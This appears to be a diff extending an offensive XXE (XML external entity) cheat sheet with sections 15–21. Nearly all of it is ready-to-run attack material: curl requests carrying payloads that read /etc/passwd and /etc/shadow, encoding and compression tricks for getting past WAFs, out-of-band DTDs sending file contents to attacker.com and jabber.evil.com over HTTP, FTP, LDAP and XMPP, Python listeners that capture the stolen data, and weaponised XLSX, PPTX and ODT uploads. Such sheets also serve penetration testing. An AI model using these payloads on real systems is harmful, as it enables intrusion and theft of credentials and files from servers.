@@ -857,3 +857,433 @@ odat.py httpuritype --server-ip target --server-port 1521 \
 odat.py utlhttp --server-ip target --server-port 1521 \
   --dSid ORCL --getFile /opt/oracle/product/19c/dbhome_1/network/admin/tnsnames.ora
 ```
+
+---
+
+## 15. Advanced XXE Payload Variations
+
+### 15.1 XXE with Character Encoding Tricks
+
+```bash
+# XXE payload with UTF-16 BE encoding to bypass WAF
+python3 -c "
+payload = '<?xml version=\"1.0\" encoding=\"UTF-16BE\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'
+with open('xxe_utf16be.xml', 'wb') as f:
+    f.write(payload.encode('utf-16-be'))
+"
+curl -X POST "http://target/api" -H "Content-Type: application/xml; charset=utf-16be" --data-binary @xxe_utf16be.xml
+
+# XXE with Shift-JIS encoding (Japanese legacy systems)
+python3 -c "
+payload = '<?xml version=\"1.0\" encoding=\"Shift_JIS\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'
+with open('xxe_sjis.xml', 'wb') as f:
+    f.write(payload.encode('shift_jis'))
+"
+curl -X POST "http://target/api" -H "Content-Type: application/xml; charset=shift_jis" --data-binary @xxe_sjis.xml
+
+# XXE with EUC-JP encoding
+python3 -c "
+payload = '<?xml version=\"1.0\" encoding=\"EUC-JP\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'
+with open('xxe_eucjp.xml', 'wb') as f:
+    f.write(payload.encode('euc-jp'))
+"
+curl -X POST "http://target/api" -H "Content-Type: application/xml; charset=euc-jp" --data-binary @xxe_eucjp.xml
+```
+
+### 15.2 XXE with XML Compression and Chunked Transfer
+
+```bash
+# Gzip-compressed XXE payload to bypass WAF inspection
+cat << 'XMLEOF' > xxe_payload.xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+XMLEOF
+gzip -c xxe_payload.xml > xxe_payload.xml.gz
+curl -X POST "http://target/api" \
+  -H "Content-Type: application/xml" \
+  -H "Content-Encoding: gzip" \
+  --data-binary @xxe_payload.xml.gz
+
+# Chunked transfer encoding for XXE payload
+curl -X POST "http://target/api" \
+  -H "Content-Type: application/xml" \
+  -H "Transfer-Encoding: chunked" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+
+# Base64-encoded XXE body
+echo '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' | base64 | \
+  curl -X POST "http://target/api" \
+  -H "Content-Type: application/xml" \
+  -H "Content-Transfer-Encoding: base64" \
+  --data-binary @-
+```
+
+---
+
+## 16. OOB XXE with Alternative Protocols
+
+### 16.1 OOB XXE via WebSocket Exfiltration
+
+```bash
+# XXE exfiltration via WebSocket connection
+# Attacker DTD that sends data through a WebSocket
+cat > xxe_ws.dtd << 'DTDEOF'
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/ws-exfil?d=%file;'>">
+%eval;
+%exfil;
+DTDEOF
+
+# WebSocket relay server to capture exfiltrated data
+python3 << 'PYEOF'
+import asyncio, websockets, http.server
+
+class ExfilHandler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        print(f"[XXE EXFIL] {self.path}")
+        self.send_response(200)
+        self.end_headers()
+
+http.server.HTTPServer(("0.0.0.0", 80), ExfilHandler).serve_forever()
+PYEOF
+```
+
+### 16.2 OOB XXE via Jabber/XMPP
+
+```bash
+# XXE exfiltration via XMPP message to attacker's Jabber server
+# DTD that sends file content as XMPP message body
+cat > xxe_xmpp.dtd << 'DTDEOF'
+<!ENTITY % file SYSTEM "file:///etc/shadow">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'xmpp://attacker@jabber.evil.com?message=%file;'>">
+%eval;
+%exfil;
+DTDEOF
+```
+
+### 16.3 OOB XXE via LDAP
+
+```bash
+# XXE exfiltration via LDAP query to attacker's LDAP server
+# The file content is embedded as the LDAP search base
+cat > xxe_ldap.dtd << 'DTDEOF'
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ldap://attacker.com:1389/%file;'>">
+%eval;
+%exfil;
+DTDEOF
+
+# Rogue LDAP server to capture exfiltrated data
+python3 << 'PYEOF'
+import socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind(("0.0.0.0", 1389))
+sock.listen(5)
+print("[LDAP] Listening on port 1389 for XXE exfiltration...")
+while True:
+    conn, addr = sock.accept()
+    data = conn.recv(4096)
+    print(f"[LDAP EXFIL] From {addr}: {data}")
+    conn.close()
+PYEOF
+```
+
+---
+
+## 17. XXE in SOAP/WSDL Advanced Exploitation
+
+### 17.1 XXE in SOAP with WS-Security
+
+```xml
+<!-- XXE in SOAP with WS-Security header -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+                  xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
+  <soapenv:Header>
+    <wsse:Security>
+      <wsse:UsernameToken>
+        <wsse:Username>&xxe;</wsse:Username>
+        <wsse:Password>test</wsse:Password>
+      </wsse:UsernameToken>
+    </wsse:Security>
+  </soapenv:Header>
+  <soapenv:Body>
+    <api:GetData/>
+  </soapenv:Body>
+</soapenv:Envelope>
+```
+
+### 17.2 XXE in WSDL Definition
+
+```xml
+<!-- XXE injection in WSDL import/include -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<definitions name="XXEService"
+             targetNamespace="http://target.com/wsdl"
+             xmlns="http://schemas.xmlsoap.org/wsdl/">
+  <import namespace="http://attacker.com/evil" location="http://attacker.com/evil.wsdl"/>
+  <message name="Request">
+    <part name="body" element="xs:string"/>
+  </message>
+</definitions>
+```
+
+### 17.3 SOAP XXE with MTOM Attachment
+
+```bash
+# Send XXE payload in SOAP MTOM (Message Transmission Optimization Mechanism)
+# Some SOAP parsers process external entities in MIME parts
+curl -X POST "http://target/soap/service" \
+  -H "Content-Type: multipart/related; type=\"application/xop+xml\"; boundary=MIME_BOUNDARY" \
+  --data-binary @- << 'MIMEEOF'
+--MIME_BOUNDARY
+Content-Type: application/xop+xml; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Body>
+    <data>&xxe;</data>
+  </soapenv:Body>
+</soapenv:Envelope>
+--MIME_BOUNDARY--
+MIMEEOF
+```
+
+---
+
+## 18. Blind XXE Detection Techniques
+
+### 18.1 Time-Based Blind XXE Detection
+
+```bash
+# Time-based blind XXE detection via slow HTTP resource
+# If the parser blocks for 10 seconds, XXE is likely present
+cat > slow_server.py << 'PYEOF'
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import time
+
+class SlowHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        print(f"[BLIND XXE DETECTED] {self.client_address}: {self.path}")
+        time.sleep(10)  # Delay response to create observable timing
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"OK")
+
+HTTPServer(("0.0.0.0", 80), SlowHandler).serve_forever()
+PYEOF
+
+# Send payload referencing slow server
+curl -X POST "http://target/api" \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/delay">]><root>&xxe;</root>'
+```
+
+### 18.2 Multi-Channel Blind XXE Confirmation
+
+```bash
+# Confirm XXE via multiple OOB channels simultaneously
+# HTTP + DNS + FTP for maximum detection probability
+
+# Terminal 1: HTTP listener
+python3 -m http.server 80
+
+# Terminal 2: DNS listener (using dnschef)
+dnschef --fakeip attacker.com --interface 0.0.0.0
+
+# Terminal 3: FTP listener
+python3 -m pyftpdlib -p 2121
+
+# Payload that triggers all three channels
+cat > xxe_multi_oob.dtd << 'DTDEOF'
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; http_exfil SYSTEM 'http://attacker.com/http?d=%file;'>">
+<!ENTITY % eval2 "<!ENTITY &#x25; ftp_exfil SYSTEM 'ftp://attacker.com:2121/%file;'>">
+%eval;
+%http_exfil;
+%eval2;
+%ftp_exfil;
+DTDEOF
+```
+
+---
+
+## 19. XXE in File Formats (Advanced)
+
+### 19.1 XXE in DOCX/XLSX Manual Injection
+
+```bash
+# Manual XXE injection into XLSX (Excel) files
+# XLSX is a ZIP archive containing XML files
+
+# Extract the XLSX file
+unzip template.xlsx -d xlsx_extracted/
+
+# Inject XXE into xl/sharedStrings.xml (most commonly parsed)
+cat > xlsx_extracted/xl/sharedStrings.xml << 'XMLEOF'
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://attacker.com/xxe-xlsx-callback">
+]>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
+  <si><t>&xxe;</t></si>
+</sst>
+XMLEOF
+
+# Rebuild the XLSX archive
+cd xlsx_extracted && zip -r ../malicious.xlsx . && cd ..
+
+# Upload the malicious XLSX
+curl -X POST "http://target/upload" \
+  -F "file=@malicious.xlsx" \
+  -F "type=application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
+```
+
+### 19.2 XXE in PPTX and Other OOXML Formats
+
+```bash
+# XXE injection into PPTX (PowerPoint) files
+unzip template.pptx -d pptx_extracted/
+
+# Inject into ppt/presentation.xml
+cat > pptx_extracted/ppt/presentation.xml << 'XMLEOF'
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://attacker.com/xxe-pptx-callback">
+]>
+<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
+  <p:sldIdLst/>
+</p:presentation>
+XMLEOF
+
+# Rebuild and upload
+cd pptx_extracted && zip -r ../malicious.pptx . && cd ..
+curl -X POST "http://target/upload" \
+  -F "file=@malicious.pptx" \
+  -F "type=application/vnd.openxmlformats-officedocument.presentationml.presentation"
+```
+
+### 19.3 XXE in OpenDocument Format (ODF)
+
+```bash
+# XXE injection into ODT (OpenDocument Text) files
+# ODT is also a ZIP archive containing XML
+
+unzip template.odt -d odt_extracted/
+
+# Inject into content.xml
+cat > odt_extracted/content.xml << 'XMLEOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">
+  <office:body>
+    <office:text>
+      <text:p>&xxe;</text:p>
+    </office:text>
+  </office:body>
+</office:document-content>
+XMLEOF
+
+# Rebuild and upload
+cd odt_extracted && zip -r ../malicious.odt . && cd ..
+curl -X POST "http://target/upload" \
+  -F "file=@malicious.odt" \
+  -F "type=application/vnd.oasis.opendocument.text"
+```
+
+---
+
+## 20. XXE Defense Evasion -- WAF and Filter Bypass
+
+### 20.1 XML Entity Obfuscation
+
+```xml
+<!-- Use CDATA sections to obfuscate entity references -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root><![CDATA[<![CDATA[]]>&xxe;<![CDATA[]]]]><![CDATA[>]]></root>
+
+<!-- Use nested entity references to hide keywords -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY a "SY">
+  <!ENTITY b "STEM">
+  <!ENTITY c "&a;&b;">
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+
+<!-- Use XML processing instructions to confuse parsers -->
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" href="http://attacker.com/evil.xsl"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+```
+
+### 20.2 XXE via XSLT Injection
+
+```xml
+<!-- XSLT stylesheet that reads files (when server processes XSLT) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <output>
+      <xsl:copy-of select="document('file:///etc/passwd')"/>
+    </output>
+  </xsl:template>
+</xsl:stylesheet>
+
+<!-- XSLT with embedded XXE in document() function -->
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <output>
+      <xsl:value-of select="document('file:///etc/shadow')"/>
+    </output>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+---
+
+## 21. XXE Automation and Tooling
+
+### 21.1 Automated XXE Scanning with XXEer
+
+```bash
+# XXEer -- automated XXE testing tool
+# Test a list of endpoints for XXE vulnerabilities
+python3 xxeer.py -l endpoints.txt --callback http://attacker.com -v
+
+# Test single endpoint with all payload variations
+python3 xxeer.py -u "http://target/api/endpoint" --method POST \
+  --content-type "application/xml" --callback http://attacker.com
+```
+
+### 21.2 Burp Suite XXE Automation
+
+```bash
+# Burp Suite active scan with XXE payloads
+# 1. Configure Collaborator: Project options -> Misc -> Collaborator server
+# 2. Right-click request -> Active scan
+# 3. Scanner will test for XXE automatically
+
+# Custom XXE scan check via Burp Extension
+# Use the "XXE Scanner" BApp from the BApp Store
+# Configure payload list and OOB callback
+```
